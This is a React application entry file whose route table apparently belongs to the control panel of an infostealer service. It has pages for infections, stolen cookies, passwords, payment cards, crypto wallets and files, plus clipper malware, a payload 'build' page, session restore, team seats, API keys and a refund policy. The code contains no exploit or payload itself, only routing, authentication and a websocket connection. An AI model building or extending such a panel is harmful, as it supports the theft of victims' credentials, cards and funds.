import { useEffect, useRef, Component, type ReactNode } from 'react'
import { createBrowserRouter, RouterProvider, Navigate } from 'react-router-dom'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { AuthProvider, useAuth } from '@/hooks/use-auth'
import { ThemeProvider } from '@/lib/theme-provider'
import { I18nProvider } from '@/lib/i18n'
import { Shell } from '@/components/layout/shell'
import { wsClient } from '@/lib/ws'
import Login from '@/pages/Login'
import Dashboard from '@/pages/Dashboard'
import Sessions from '@/pages/Sessions'
import SessionDetail from '@/pages/SessionDetail'
import SearchPage from '@/pages/Search'
import BuildPage from '@/pages/Build'
import Settings from '@/pages/Settings'
import UsersPage from '@/pages/Users'
import TeamPage from '@/pages/TeamPage'
import RestorePage from '@/pages/Restore'
import DocsPage from '@/pages/DocsPage'
import PublicStatsPage from '@/pages/PublicStatsPage'
import RefundPolicy from '@/pages/RefundPolicy'
import ApiKeysPage from '@/pages/ApiKeysPage'
import SupportPage from '@/pages/SupportPage'

class ErrorBoundary extends Component<{ children: ReactNode }, { hasError: boolean }> {
  constructor(props: { children: ReactNode }) { super(props); this.state = { hasError: false } }
  static getDerivedStateFromError() { return { hasError: true } }
  render() {
    if (this.state.hasError) {
      return <div className="flex items-center justify-center h-screen"><p className="text-sm text-muted-foreground">{/* i18n: error.something_wrong */}Something went wrong.</p></div>
    }
    return this.props.children
  }
}

const queryClient = new QueryClient({
  defaultOptions: { queries: { retry: 1, refetchOnWindowFocus: false, staleTime: 10_000 } },
})

function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const { isAuthenticated, isLoading } = useAuth()
  const connectedRef = useRef(false)

  useEffect(() => {
    if (isAuthenticated && !connectedRef.current) {
      const token = localStorage.getItem('token')
      if (token) { wsClient.connect(token); connectedRef.current = true }
    }
    return () => { if (connectedRef.current) { wsClient.disconnect(); connectedRef.current = false } }
  }, [isAuthenticated])

  if (isLoading) return <div className="flex items-center justify-center h-screen"><div className="h-6 w-6 border-2 border-primary border-t-transparent rounded-full animate-spin" /></div>
  if (!isAuthenticated) return <Navigate to="/login" replace />
  return <>{children}</>
}

function NotFound() {
  return <div className="flex flex-col items-center justify-center h-[60vh] gap-4"><h1 className="text-4xl font-bold">404</h1><p className="text-muted-foreground">Page not found</p></div>
}

export const router = createBrowserRouter([
  { path: '/login', element: <Login /> },
  { path: '/public', element: <PublicStatsPage /> },
  { path: '/refund', element: <RefundPolicy /> },
  {
    path: '/',
    element: <ProtectedRoute><Shell /></ProtectedRoute>,
    children: [
      { index: true, element: <Dashboard /> },
      { path: 'sessions', element: <Sessions /> },
      { path: 'sessions/:id', element: <SessionDetail /> },
      // Category routes — Sessions reads the URL path to filter by type
      { path: 'infections', element: <Sessions /> },
      { path: 'cookies', element: <Sessions /> },
      { path: 'passwords', element: <Sessions /> },
      { path: 'cards', element: <Sessions /> },
      { path: 'wallets', element: <Sessions /> },
      { path: 'files', element: <Sessions /> },
      { path: 'clippers', element: <Sessions /> },
      { path: 'tasks', element: <Sessions /> },
      { path: 'search', element: <SearchPage /> },
      { path: 'build', element: <BuildPage /> },
      { path: 'restore', element: <RestorePage /> },
      { path: 'docs', element: <DocsPage /> },
      { path: 'docs/*', element: <DocsPage /> },
      { path: 'users', element: <UsersPage /> },
      { path: 'team', element: <TeamPage /> },
      { path: 'settings', element: <Settings /> },
      { path: 'api-keys', element: <ApiKeysPage /> },
      { path: 'support', element: <SupportPage /> },
      { path: '*', element: <NotFound /> },
    ],
  },
])

export default function App() {
  return (
    <ErrorBoundary>
      <QueryClientProvider client={queryClient}>
        <ThemeProvider>
          <I18nProvider>
          <AuthProvider>
            <RouterProvider router={router} />
          </AuthProvider>
          </I18nProvider>
        </ThemeProvider>
      </QueryClientProvider>
    </ErrorBoundary>
  )
}
